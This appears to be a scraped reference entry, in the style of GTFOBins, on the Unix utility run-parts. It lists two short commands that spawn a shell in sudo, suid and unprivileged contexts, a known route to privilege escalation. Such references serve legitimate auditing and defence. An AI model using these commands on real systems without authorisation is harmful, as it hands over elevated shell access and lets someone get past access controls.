title: run-parts
html:
run-parts

Shell

Context: sudo, suid, unprivileged

run-parts --new-session --regex '^sh$' /bin

Context: sudo, suid, unprivileged

cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/
excerpt: run-parts Shell Context: sudo, suid, unprivileged run-parts --new-session --regex '^sh$' /bin Context: sudo, suid, unprivileged cp /bin/sh /path/to/temp-dir/ run-parts /path/to/temp-dir/
